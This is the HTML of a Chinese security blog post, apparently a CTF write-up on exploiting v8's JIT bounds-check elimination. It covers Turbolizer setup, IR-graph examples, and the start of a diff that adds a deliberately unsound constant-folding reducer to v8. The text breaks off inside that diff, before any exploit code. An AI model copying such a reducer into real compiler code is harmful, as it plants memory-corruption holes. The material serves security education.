@@ -1,0 +1,557 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/ha1vk/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/ha1vk/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/ha1vk/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/ha1vk/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/ha1vk/css/main.css">
+
+
+<link rel="stylesheet" href="/ha1vk/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"github.com","root":"/ha1vk/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.json"};
+  </script>
+
+  <meta name="description" content="文章首发于安全KER https:&#x2F;&#x2F;www.anquanke.com&#x2F;post&#x2F;id&#x2F;226065 0x00 前言从两道题学习v8中JIT优化的CheckBounds消除在漏洞中的利用 0x01 前置知识生成IR图">
+<meta property="og:type" content="article">
+<meta property="og:title" content="v8的JIT边界检查(CheckBounds)消除的利用">
+<meta property="og:url" content="https://github.com/ha1vk/2020/12/29/v8-checkbounds/index.html">
+<meta property="og:site_name" content="ha1vk&#39;s blog">
+<meta property="og:description" content="文章首发于安全KER https:&#x2F;&#x2F;www.anquanke.com&#x2F;post&#x2F;id&#x2F;226065 0x00 前言从两道题学习v8中JIT优化的CheckBounds消除在漏洞中的利用 0x01 前置知识生成IR图">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://p5.ssl.qhimg.com/t01aa0501605245f8f2.png">
+<meta property="og:image" content="https://p4.ssl.qhimg.com/t0113b4f5547db5ef00.png">
+<meta property="og:image" content="https://p1.ssl.qhimg.com/t018b2c59bb6a15191d.png">
+<meta property="og:image" content="https://p3.ssl.qhimg.com/t01643b4b72a732fa92.png">
+<meta property="og:image" content="https://p3.ssl.qhimg.com/t016b88dd8046ef76ae.png">
+<meta property="og:image" content="https://p0.ssl.qhimg.com/t0141091bbfb48cf14b.png">
+<meta property="og:image" content="https://p3.ssl.qhimg.com/t0109b89a808c56c9dd.png">
+<meta property="og:image" content="https://p0.ssl.qhimg.com/t01de93232cc821f6ee.png">
+<meta property="og:image" content="https://p4.ssl.qhimg.com/t01040f498b719f38ed.png">
+<meta property="og:image" content="https://p4.ssl.qhimg.com/t01e301c4340944c32b.png">
+<meta property="og:image" content="https://p5.ssl.qhimg.com/t01907226ac456570bb.png">
+<meta property="og:image" content="https://p5.ssl.qhimg.com/t014d0fba0462389d80.png">
+<meta property="og:image" content="https://p0.ssl.qhimg.com/t01ab1976131a4dd33c.png">
+<meta property="og:image" content="https://p5.ssl.qhimg.com/t01bbae7ab1fc8de91c.png">
+<meta property="og:image" content="https://p4.ssl.qhimg.com/t0145b5d118c312ee6c.png">
+<meta property="og:image" content="https://p4.ssl.qhimg.com/t01a5d7a91b568081b8.png">
+<meta property="og:image" content="https://p4.ssl.qhimg.com/t0129d29f5c4e26423c.png">
+<meta property="og:image" content="https://p5.ssl.qhimg.com/t012a34341a0c5e0c32.png">
+<meta property="article:published_time" content="2020-12-29T06:30:53.000Z">
+<meta property="article:modified_time" content="2025-06-26T09:18:38.115Z">
+<meta property="article:author" content="ha1vk">
+<meta property="article:tag" content="JS引擎漏洞">
+<meta property="article:tag" content="类型混淆">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://p5.ssl.qhimg.com/t01aa0501605245f8f2.png">
+
+<link rel="canonical" href="https://github.com/ha1vk/2020/12/29/v8-checkbounds/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>v8的JIT边界检查(CheckBounds)消除的利用 | ha1vk's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/ha1vk/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">ha1vk's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/ha1vk/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/ha1vk/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/ha1vk/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/ha1vk/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/ha1vk/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://github.com/ha1vk/2020/12/29/v8-checkbounds/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/ha1vk/images/avatar.gif">
+      <meta itemprop="name" content="ha1vk">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ha1vk's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          v8的JIT边界检查(CheckBounds)消除的利用
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-12-29 14:30:53" itemprop="dateCreated datePublished" datetime="2020-12-29T14:30:53+08:00">2020-12-29</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2025-06-26 17:18:38" itemprop="dateModified" datetime="2025-06-26T17:18:38+08:00">2025-06-26</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/ha1vk/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/ha1vk/categories/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/" itemprop="url" rel="index"><span itemprop="name">安全研究</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>文章首发于安全KER <a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/226065">https://www.anquanke.com/post/id/226065</a></p>
+<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>从两道题学习v8中JIT优化的CheckBounds消除在漏洞中的利用</p>
+<h2 id="0x01-前置知识"><a href="#0x01-前置知识" class="headerlink" title="0x01 前置知识"></a>0x01 前置知识</h2><h3 id="生成IR图"><a href="#生成IR图" class="headerlink" title="生成IR图"></a>生成IR图</h3><p>在运行d8时加一个<code>--trace-turbo</code>选项，运行完成后，会在当前目录下生成一些json文件，这些便是JIT优化时的IR图数据。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./d8 --trace-turbo test.js</span><br></pre></td></tr></table></figure>
+<h3 id="Turbolizer搭建"><a href="#Turbolizer搭建" class="headerlink" title="Turbolizer搭建"></a>Turbolizer搭建</h3><p>我们需要看懂v8的<code>sea of node</code>的IR图，v8为我们准备了一个可视化的IR图查看器<code>Turbolizer</code>，搭建<code>Turbolizer</code>的方法如下（先确保node.js为新版本）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd tools/turbolizer</span><br><span class="line">npm i</span><br><span class="line">npm run-script build</span><br><span class="line">python -m SimpleHTTPServer</span><br></pre></td></tr></table></figure>
+<p>然后浏览器访问8000端口，即可使用该工具，按CTRL+L可以将v8生成的IR图数据文件加载进来可视化查看<br><img src="https://p5.ssl.qhimg.com/t01aa0501605245f8f2.png"></p>
+<h3 id="sea-of-node学习"><a href="#sea-of-node学习" class="headerlink" title="sea of node学习"></a>sea of node学习</h3><p>一个简单的示例，使用<code>--trace-turbo</code>运行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">function opt(f) &#123;</span><br><span class="line">   var x = f ? 1.1 : 2.2;</span><br><span class="line">   x += 1;</span><br><span class="line">   x *= 1;</span><br><span class="line">   return x;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">for (var i=0;i&lt;0x20000;i++) &#123;</span><br><span class="line">   opt(true);</span><br><span class="line">   opt(false);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">print(opt(true));</span><br></pre></td></tr></table></figure>
+<p>将生成的json文件用<code>Turbolizer</code>打开<br><img src="https://p4.ssl.qhimg.com/t0113b4f5547db5ef00.png"><br>左上角有许多的阶段选择，后面的序号代表它们的顺序，首先是<code>TFBytecodeGraphBuilder</code>阶段，该阶段就是简单的将js代码翻译为字节码，点击展开按钮，我们将所有节点展开查看<br><img src="https://p1.ssl.qhimg.com/t018b2c59bb6a15191d.png"><br>我们的<code>var x = f ? 1.1 : 2.2;</code>被翻译为了一个<code>Phi</code>节点，即其具体值不能在编译时确定，然后使用了<code>SpeculativeNumberAdd</code>和<code>SpeculativeNumberMultiply</code>做了<code>x+=1;x*=1</code>的运算。<br>接下来进入一个比较重要的阶段是<code>TFTyper</code>阶段，该阶段会尽可能的推测出节点的类型<br><img src="https://p3.ssl.qhimg.com/t01643b4b72a732fa92.png"><br>其中整数会使用<code>Range</code>来表示，接下来<code>TFTypedLowering</code>阶段会使用更加合适的函数来进行运算<br><img src="https://p3.ssl.qhimg.com/t016b88dd8046ef76ae.png"><br>在<code>TFSimplifiedLowering</code>阶段，会去掉一些不必要的运算，然后统一类型<br><img src="https://p0.ssl.qhimg.com/t0141091bbfb48cf14b.png"></p>
+<h3 id="CheckBounds节点"><a href="#CheckBounds节点" class="headerlink" title="CheckBounds节点"></a>CheckBounds节点</h3><p>在数组下标访问中，<code> CheckBounds</code>用来检查边界，如下一个简单示例</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">function opt() &#123;</span><br><span class="line">   var arr = [1.1,2.2];</span><br><span class="line">   var x = 1;</span><br><span class="line">   return arr[x];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">for (var i=0;i&lt;0x20000;i++) &#123;</span><br><span class="line">   opt();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">print(opt());</span><br></pre></td></tr></table></figure>
+<p>如图，在<code>TFLoadElimination</code>阶段，有CheckBounds检查下标是否越界<br><img src="https://p3.ssl.qhimg.com/t0109b89a808c56c9dd.png"><br>然而到了<code>simplified lowering</code>阶段，由于已经知道下标没有越界，因此可以直接去掉<code>CheckBounds</code>节点<br><img src="https://p0.ssl.qhimg.com/t01de93232cc821f6ee.png"><br>现在假如我们将arr对象放到opt函数外部，那么由于编译的是opt函数，arr的信息JIT不能完全掌握，便不会消除<code>CheckBounds</code>节点</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var arr = [1.1,2.2];</span><br><span class="line">function opt() &#123;</span><br><span class="line">   var x = 1;</span><br><span class="line">   return arr[x];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>然而在最新版的v8中，不再有<code>CheckBounds</code>的消除，因为这个对于漏洞利用来说太方便了。<br><img src="https://p4.ssl.qhimg.com/t01040f498b719f38ed.png"></p>
+<h3 id="CheckBounds消除的利用"><a href="#CheckBounds消除的利用" class="headerlink" title="CheckBounds消除的利用"></a>CheckBounds消除的利用</h3><p>在数值的运算错误漏洞中，在javascript层和JIT优化的代码，两者计算的数值如果不一致，那么就可以利用这种<code>CheckBounds消除</code>来实现数组越界</p>
+<h2 id="0x02-google-ctf2018-final-just-in-time"><a href="#0x02-google-ctf2018-final-just-in-time" class="headerlink" title="0x02 google-ctf2018-final-just-in-time"></a>0x02 google-ctf2018-final-just-in-time</h2><h3 id="patch分析"><a href="#patch分析" class="headerlink" title="patch分析"></a>patch分析</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/BUILD.gn b/BUILD.gn</span><br><span class="line">index c6a58776cd..14c56d2910 100644</span><br><span class="line">--- a/BUILD.gn</span><br><span class="line">+++ b/BUILD.gn</span><br><span class="line">@@ -1699,6 +1699,8 @@ v8_source_set(&quot;v8_base&quot;) &#123;</span><br><span class="line">     &quot;src/compiler/dead-code-elimination.cc&quot;,</span><br><span class="line">     &quot;src/compiler/dead-code-elimination.h&quot;,</span><br><span class="line">     &quot;src/compiler/diamond.h&quot;,</span><br><span class="line">+    &quot;src/compiler/duplicate-addition-reducer.cc&quot;,</span><br><span class="line">+    &quot;src/compiler/duplicate-addition-reducer.h&quot;,</span><br><span class="line">     &quot;src/compiler/effect-control-linearizer.cc&quot;,</span><br><span class="line">     &quot;src/compiler/effect-control-linearizer.h&quot;,</span><br><span class="line">     &quot;src/compiler/escape-analysis-reducer.cc&quot;,</span><br><span class="line">diff --git a/src/compiler/duplicate-addition-reducer.cc b/src/compiler/duplicate-addition-reducer.cc</span><br><span class="line">new file mode 100644</span><br><span class="line">index 0000000000..59e8437f3d</span><br><span class="line">--- /dev/null</span><br><span class="line">+++ b/src/compiler/duplicate-addition-reducer.cc</span><br><span class="line">@@ -0,0 +1,71 @@</span><br><span class="line">+// Copyright 2018 Google LLC</span><br><span class="line">+//</span><br><span class="line">+// Licensed under the Apache License, Version 2.0 (the &quot;License&quot;);</span><br><span class="line">+// you may not use this file except in compliance with the License.</span><br><span class="line">+// You may obtain a copy of the License at</span><br><span class="line">+//</span><br><span class="line">+//      http://www.apache.org/licenses/LICENSE-2.0</span><br><span class="line">+//</span><br><span class="line">+// Unless required by applicable law or agreed to in writing, software</span><br><span class="line">+// distributed under the License is distributed on an &quot;AS IS&quot; BASIS,</span><br><span class="line">+// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.</span><br><span class="line">+// See the License for the specific language governing permissions and</span><br><span class="line">+// limitations under the License.</span><br><span class="line">+#include &quot;src/compiler/duplicate-addition-reducer.h&quot;</span><br><span class="line">+</span><br><span class="line">+#include &quot;src/compiler/common-operator.h&quot;</span><br><span class="line">+#include &quot;src/compiler/graph.h&quot;</span><br><span class="line">+#include &quot;src/compiler/node-properties.h&quot;</span><br><span class="line">+</span><br><span class="line">+namespace v8 &#123;</span><br><span class="line">+namespace internal &#123;</span><br><span class="line">+namespace compiler &#123;</span><br><span class="line">+</span><br><span class="line">+DuplicateAdditionReducer::DuplicateAdditionReducer(Editor* editor, Graph* graph,</span><br><span class="line">+                     CommonOperatorBuilder* common)</span><br><span class="line">+    : AdvancedReducer(editor),</span><br><span class="line">+      graph_(graph), common_(common) &#123;&#125;</span><br><span class="line">+</span><br><span class="line">+Reduction DuplicateAdditionReducer::Reduce(Node* node) &#123;</span><br><span class="line">+  switch (node-&gt;opcode()) &#123;</span><br><span class="line">+    case IrOpcode::kNumberAdd:</span><br><span class="line">+      return ReduceAddition(node);</span><br><span class="line">+    default:</span><br><span class="line">+      return NoChange();</span><br><span class="line">+  &#125;</span><br><span class="line">+&#125;</span><br><span class="line">+</span><br><span class="line">+Reduction DuplicateAdditionReducer::ReduceAddition(Node* node) &#123;</span><br><span class="line">+  DCHECK_EQ(node-&gt;op()-&gt;ControlInputCount(), 0);</span><br><span class="line">+  DCHECK_EQ(node-&gt;op()-&gt;EffectInputCount(), 0);</span><br><span class="line">+  DCHECK_EQ(node-&gt;op()-&gt;ValueInputCount(), 2);</span><br><span class="line">+</span><br><span class="line">+  Node* left = NodeProperties::GetValueInput(node, 0);</span><br><span class="line">+  if (left-&gt;opcode() != node-&gt;opcode()) &#123;</span><br><span class="line">+    return NoChange();</span><br><span class="line">+  &#125;</span><br><span class="line">+</span><br><span class="line">+  Node* right = NodeProperties::GetValueInput(node, 1);</span><br><span class="line">+  if (right-&gt;opcode() != IrOpcode::kNumberConstant) &#123;</span><br><span class="line">+    return NoChange();</span><br><span class="line">+  &#125;</span><br><span class="line">+</span><br><span class="line">+  Node* parent_left = NodeProperties::GetValueInput(left, 0);</span><br><span class="line">+  Node* parent_right = NodeProperties::GetValueInput(left, 1);</span><br><span class="line">+  if (parent_right-&gt;opcode() != IrOpcode::kNumberConstant) &#123;</span><br><span class="line">+    return NoChange();</span><br><span class="line">+  &#125;</span><br><span class="line">+</span><br><span class="line">+  double const1 = OpParameter&lt;double&gt;(right-&gt;op());</span><br><span class="line">+  double const2 = OpParameter&lt;double&gt;(parent_right-&gt;op());</span><br><span class="line">+  Node* new_const = graph()-&gt;NewNode(common()-&gt;NumberConstant(const1+const2));</span><br><span class="line">+</span><br><span class="line">+  NodeProperties::ReplaceValueInput(node, parent_left, 0);</span><br><span class="line">+  NodeProperties::ReplaceValueInput(node, new_const, 1);</span><br><span class="line">+</span><br><span class="line">+  return Changed(node);</span><br><span class="line">+&#125;</span><br><span class="line">+</span><br><span class="line">+&#125;  // namespace compiler</span><br><span class="line">+&#125;  // namespace internal</span><br><span class="line">+&#125;  // namespace v8</span><br><span class="line">diff --git a/src/compiler/duplicate-addition-reducer.h b/src/compiler/duplicate-addition-reducer.h</span><br><span class="line">new file mode 100644</span><br><span class="line">index 0000000000..7285f1ae3e</span><br><span class="line">--- /dev/null</span><br><span class="line">+++ b/src/compiler/duplicate-addition-reducer.h</span><br><span class="line">@@ -0,0 +1,60 @@</span><br><span class="line">+/*</span><br><span class="line">+ * Copyright 2018 Google LLC</span><br><span class="line">+ *</span><br><span class="line">+ * Licensed under the Apache License, Version 2.0 (the &quot;License&quot;);</span><br><span class="line">+ * you may not use this file except in compliance with the License.</span><br><span class="line">+ * You may obtain a copy of the License at</span><br><span class="line">+ *</span><br><span class="line">+ *      http://www.apache.org/licenses/LICENSE-2.0</span><br><span class="line">+ *</span><br><span class="line">+ * Unless required by applicable law or agreed to in writing, software</span><br><span class="line">+ * distributed under the License is distributed on an &quot;AS IS&quot; BASIS,</span><br><span class="line">+ * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.</span><br><span class="line">+ * See the License for the specific language governing permissions and</span><br><span class="line">+ * limitations under the License.</span><br><span class="line">+ */</span><br><span class="line">+</span><br><span class="line">+#ifndef V8_COMPILER_DUPLICATE_ADDITION_REDUCER_H_</span><br><span class="line">+#define V8_COMPILER_DUPLICATE_ADDITION_REDUCER_H_</span><br><span class="line">+</span><br><span class="line">+#include &quot;src/base/compiler-specific.h&quot;</span><br><span class="line">+#include &quot;src/compiler/graph-reducer.h&quot;</span><br><span class="line">+#include &quot;src/globals.h&quot;</span><br><span class="line">+#include &quot;src/machine-type.h&quot;</span><br><span class="line">+</span><br><span class="line">+namespace v8 &#123;</span><br><span class="line">+namespace internal &#123;</span><br><span class="line">+namespace compiler &#123;</span><br><span class="line">+</span><br><span class="line">+// Forward declarations.</span><br><span class="line">+class CommonOperatorBuilder;</span><br><span class="line">+class Graph;</span><br><span class="line">+</span><br><span class="line">+class V8_EXPORT_PRIVATE DuplicateAdditionReducer final</span><br><span class="line">+    : public NON_EXPORTED_BASE(AdvancedReducer) &#123;</span><br><span class="line">+ public:</span><br><span class="line">+  DuplicateAdditionReducer(Editor* editor, Graph* graph,</span><br><span class="line">+                      CommonOperatorBuilder* common);</span><br><span class="line">+  ~DuplicateAdditionReducer() final &#123;&#125;</span><br><span class="line">+</span><br><span class="line">+  const char* reducer_name() const override &#123; return &quot;DuplicateAdditionReducer&quot;; &#125;</span><br><span class="line">+</span><br><span class="line">+  Reduction Reduce(Node* node) final;</span><br><span class="line">+</span><br><span class="line">+ private:</span><br><span class="line">+  Reduction ReduceAddition(Node* node);</span><br><span class="line">+</span><br><span class="line">+  Graph* graph() const &#123; return graph_;&#125;</span><br><span class="line">+  CommonOperatorBuilder* common() const &#123; return common_; &#125;;</span><br><span class="line">+</span><br><span class="line">+  Graph* const graph_;</span><br><span class="line">+  CommonOperatorBuilder* const common_;</span><br><span class="line">+</span><br><span class="line">+  DISALLOW_COPY_AND_ASSIGN(DuplicateAdditionReducer);</span><br><span class="line">+&#125;;</span><br><span class="line">+</span><br><span class="line">+&#125;  // namespace compiler</span><br><span class="line">+&#125;  // namespace internal</span><br><span class="line">+&#125;  // namespace v8</span><br><span class="line">+</span><br><span class="line">+#endif  // V8_COMPILER_DUPLICATE_ADDITION_REDUCER_H_</span><br><span class="line">diff --git a/src/compiler/pipeline.cc b/src/compiler/pipeline.cc</span><br><span class="line">index 5717c70348..8cca161ad5 100644</span><br><span class="line">--- a/src/compiler/pipeline.cc</span><br><span class="line">+++ b/src/compiler/pipeline.cc</span><br><span class="line">@@ -27,6 +27,7 @@</span><br><span class="line"> #include 